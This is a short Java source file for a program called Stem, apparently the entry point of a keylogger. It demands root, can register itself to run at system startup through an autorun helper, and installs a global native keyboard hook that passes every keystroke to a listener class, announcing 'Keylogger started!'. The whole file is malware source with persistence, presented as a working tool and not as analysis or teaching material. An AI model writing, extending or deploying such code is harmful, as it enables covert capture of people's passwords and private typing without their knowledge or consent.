import org.jnativehook.GlobalScreen;
import utils.Autorun;
import utils.KeyboardListener;

public class Stem {

    public static void main(String[] args) throws Exception {
        if (!System.getProperty("user.name").equals("root")) {
            System.out.println("Use 'sudo'!");
            return;
        }

        if (args.length > 0 && args[0].equals("-autorun"))
            new Autorun().bind();

        new Stem().start();
    }

    public void start() throws Exception {
        System.out.println("Launch...");    
        startKeylogger();
        System.out.println("Stem is alive!");
    }

    private void startKeylogger() throws Exception {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new KeyboardListener());

        System.out.println("Keylogger started!");
    }

}
